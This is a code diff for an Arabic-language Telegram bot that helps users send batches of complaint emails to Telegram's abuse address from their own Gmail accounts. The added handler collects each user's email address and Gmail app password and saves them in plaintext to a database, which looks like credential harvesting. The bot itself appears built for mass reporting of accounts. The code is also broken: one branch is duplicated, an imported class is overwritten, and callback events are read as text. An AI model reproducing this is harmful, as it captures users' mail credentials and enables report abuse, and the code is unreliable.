@@ -1,8 +1,8 @@
 from telethon import TelegramClient, events, Button
-import os
-import smtplib
-from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from database import Message
+import smtplib, os
 
 default_smtp_server = "smtp.gmail.com"
 default_smtp_port = 465
@@ -25,6 +25,55 @@ async def start(event):
         "اهلا اخي حياك الله , البوت مجاني حاليا يرفع بلاغات بصوره امنة وحقيقية \n المطور @K_4X1",
         buttons=buttons
     )
+#تحفظ في قاعدة البيانات    
+@client.on(events.CallbackQuery(data=b"save_message"))
+async def save_message(event):
+    id = event.sender_id
+    state = user_states[id]
+    step = state['step']
+    if step == 'get_subject':
+        state['subject'] = event.text
+        state['step'] = 'get_body'
+        await event.respond("أرسل نص الكليشة (الكليشة الكبيرة)")
+    elif step == 'get_body':
+        state['body'] = event.text
+        state['step'] = 'get_recipient'
+        await event.respond("أرسل الإيميل المستلم (`abuse@telegram.org`)")
+    elif step == 'get_recipient':
+        state['recipient'] = event.text
+        state['step'] = 'get_email'
+        await event.respond("أرسل بريدك الإلكتروني (الايميل الذي تريد منه الارسال)")
+    elif step == 'get_email':
+        state['sender_email'] = event.text
+        state['step'] = 'get_password'
+        await event.respond("أرسل كلمة المرور (كلمة مرور التطبيق كما في الفديو)")
+        state['sender_email'] = event.text
+        state['step'] = 'get_password'
+        await event.respond("أرسل كلمة المرور (كلمة مرور التطبيق كما في الفديو)")
+    elif step == 'get_password':
+        state['password'] = event.text
+        subject = state['subject']
+        body = state['body']
+        recipient = state['recipient']
+        sender_email = state['sender_email']
+        password = state['password']
+        email_message = create_email_message(subject, body, recipient)
+        buttons = [
+            [Button.inline("إرسال الرسالة", b"send_email")]
+        ]
+        await event.respond(
+            f"تم إنشاء الكليشة التالية:\n\n{email_message}\n\nاضغط على الزر أدناه لإرسالها",
+            buttons=buttons
+        )
+        state['step'] = 'confirm_send'
+        Message = Message(
+            subject=subject,
+            body=body,
+            recipient=recipient,
+            sender_email=sender_email,
+            password=password
+        )
+        Message.save()
 @client.on(events.CallbackQuery(data=b"create_message"))
 async def create_message(event):
     user_states[event.sender_id] = {'step': 'get_subject'}
